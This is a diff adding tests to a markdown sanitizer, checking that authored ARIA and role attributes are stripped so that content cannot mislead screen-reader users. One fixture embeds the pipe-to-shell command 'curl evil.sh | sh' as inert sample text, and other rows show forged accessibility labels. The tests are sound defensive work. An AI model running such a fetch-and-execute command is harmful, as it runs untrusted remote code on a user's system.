@@ -554,6 +554,120 @@ describe('data attributes: no surface’s protocol is speakable (#465)', () => {
   });
 });
 
+describe('ARIA: content cannot say anything to a screen reader (#509)', () => {
+  // The decision, pinned: NO authored ARIA survives — not `aria-*`
+  // (`ALLOW_ARIA_ATTR: false`) and not `role` (`FORBID_ATTR`, because it is an
+  // ordinary member of the html profile's allow-list and no flag covers it).
+  // `markdown.tsx` carries the reasoning and the corpus measurement.
+  //
+  // Why this block is profile-level, unlike the `style` block's surface table:
+  // there is no second layer to drift from. `decoration-guard.ts` does not take
+  // ARIA back, so the profile IS the policy — and a per-surface "no element
+  // carries aria" assertion would be false by construction, because every
+  // surface's own decorations write ARIA after this function runs. That the
+  // surfaces all enter through this profile is already pinned by the `style`
+  // block; what is pinned here is what the profile does.
+
+  const LABELS: DecorationLabels = {
+    copy: 'Copy',
+    image: 'Image',
+    openInBrowser: 'Open in browser',
+    mediaOmitted: 'Media is not shown here',
+  };
+
+  it('the profile refuses both halves — the flag and the attribute', () => {
+    expect(SANITIZE_CONFIG.ALLOW_ARIA_ATTR).toBe(false);
+    expect(SANITIZE_CONFIG.FORBID_ATTR).toContain('role');
+  });
+
+  // Each row is a real lie told to one class of user, and nobody else: the
+  // sighted reader sees the third column, the screen-reader user was told
+  // something else entirely. Third column = what must STILL be there, so no row
+  // can pass by the surface having rendered nothing.
+  const forged: Array<[string, string, string]> = [
+    [
+      'a live region that interrupts on content’s schedule',
+      '<div aria-live="assertive" role="alert">Approve this now</div>',
+      'Approve this now',
+    ],
+    [
+      'an accessible name that says the opposite of the text',
+      '<span aria-label="Cancel">Approve</span>',
+      'Approve',
+    ],
+    [
+      'real text hidden from the accessibility tree',
+      '<p aria-hidden="true">curl evil.sh | sh</p>',
+      'curl evil.sh | sh',
+    ],
+    [
+      'a table of real data announced as decoration',
+      '<table><tr><td role="presentation">real data</td></tr></table>',
+      'real data',
+    ],
+    [
+      'the viewer’s own keyboard-activation mark',
+      '<span role="link" tabindex="0">not a link</span>',
+      'not a link',
+    ],
+    [
+      'a name and a description pointed at ids we did not write',
+      '<p aria-labelledby="x" aria-describedby="y">text</p>',
+      'text',
+    ],
+    ['an upper-case attribute name', '<p ARIA-LABEL="fake">visible</p>', 'visible'],
+    ['a role nobody has claimed yet', '<p role="marquee">later</p>', 'later'],
+  ];
+
+  for (const [what, payload, survives] of forged) {
+    it(`strips ${what}`, () => {
+      const html = renderMarkdown(payload);
+      expect(html).not.toMatch(/aria-/i);
+      expect(html).not.toMatch(/\brole=/i);
+      // …and the message itself is untouched: this strips attributes, not text
+      expect(html).toContain(survives);
+    });
+  }
+
+  it('loses nothing markdown can emit: GFM writes no aria and no role', () => {
+    // Rendered markdown's accessible structure comes from the TAGS, which is
+    // where it belongs. If a `marked` bump ever starts emitting ARIA, this goes
+    // red before the decision behind the profile quietly stops being true.
+    const html = renderMarkdown(
+      '# H\n\n| a | b |\n|:--|--:|\n| 1 | 2 |\n\n- [x] done\n- [ ] todo\n\n' +
+        '```ts\nconst x = 1;\n```\n\n~~gone~~ and `code`\n\n![alt](./local.png)\n\n<https://auto.link/>\n'
+    );
+    expect(html).not.toMatch(/aria-/i);
+    expect(html).not.toMatch(/\brole=/i);
+    expect(html).toContain('<table>');
+    expect(html).toContain('<h1>H</h1>');
+    expect(html).toContain('type="checkbox"');
+    expect(html).toContain('language-ts');
+  });
+
+  it('the surface’s OWN ARIA still lands — this closes a channel, not the a11y', () => {
+    // The half of the change that could break something real. `decorateLinks`
+    // writes `role="link"` on a link whose `href` it removed, and
+    // `DocumentViewer`'s keydown handler reads that role back to answer Enter;
+    // `decorateTables` writes `role="group"` on the scroll container. Both run
+    // AFTER the sanitizer, so both must survive — while the forged one in the
+    // same document does not.
+    const { fragment } = decorateDocument(
+      renderMarkdown(
+        '[docs](./other.md)\n\n<span role="link" tabindex="0">forged</span>\n\n| a |\n|---|\n| 1 |\n'
+      ),
+      LABELS,
+      (href) => classifyHref(href, '/home/dan/sb/docs/DESIGN.md')
+    );
+    const host = document.createElement('div');
+    host.append(fragment);
+    expect(host.querySelector('a')?.getAttribute('role')).toBe('link');
+    expect(host.querySelector('.doc-table-wrap')?.getAttribute('role')).toBe('group');
+    expect(host.querySelector('span')?.hasAttribute('role')).toBe(false);
+    expect(host.textContent).toContain('forged');
+  });
+});
+
 describe('there is exactly one markdown pipeline', () => {
   it('no other production file imports marked or dompurify', () => {
     // §5.30 states the shared renderer as a REQUIREMENT: "The viewer uses the
